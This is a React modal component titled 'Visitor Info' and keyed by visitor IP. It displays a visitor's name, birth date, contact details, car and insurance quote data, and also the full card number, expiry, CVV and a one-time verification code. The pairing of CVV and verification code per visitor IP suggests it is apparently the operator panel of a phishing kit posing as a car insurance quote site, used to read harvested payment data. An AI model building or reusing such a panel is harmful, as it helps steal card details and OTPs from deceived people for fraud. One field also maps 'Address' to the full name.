import React from "react";
import { Modal, Button } from "react-bootstrap";

export default function InfoModal({ ip, user, onClose }) {
  const rows = [
    ["Full Name", user.fullName],
    ["Address", user.fullName],
    ["Dob", user.dob],
    ["Email", user.email],
    ["Gender", user.gender],
    ["Phone", user.phone],
    ["Car Body", user.carBody],
    ["Car Brand", user.brand],
    ["Car Model", user.model],
    ["Car year", user.year],
    ["Car Seat", user.seat],
    ["Car Cyl", user.cyl],
    ["Vehicle Type", user.vehicleType],
    ["Registration Year", user.registrationYear],
    ["Card Id", user.cardId],
    ["Insurance Type", user.type],
    ["Insurance Cost", user.cost],
    ["Plate Number", user.plateNumber],
    ["Policy Start Date", user.policyStartDate],
    ["Quote Term", user.term],
    ["Quote Payment Method", user.paymentMethod],
    ["Quote Amount", user.amount],
    ["Quote Currency", user.currency],
    ["birthDate", user.birthDate],
    ["Card Holder", user.cardHolderName],
    ["Card #", user.cardNumber],
    ["Expiry", user.expirationDate],
    ["CVV", user.cvv],
    ["Verification Code", user.verificationCode],
  ];

  return (
    <Modal show onHide={onClose} size="lg" centered>
      <Modal.Header closeButton>
        <Modal.Title>Visitor Info — {ip}</Modal.Title>
      </Modal.Header>
      <Modal.Body style={{ direction: "rtl" }}>
        {rows.map(([label, val]) => (
          <p key={label}>
            <strong>{label}:</strong> {val ?? "—"}
          </p>
        ))}
      </Modal.Body>
      <Modal.Footer>
        <Button variant="secondary" onClick={onClose}>
          Close
        </Button>
      </Modal.Footer>
    </Modal>
  );
}
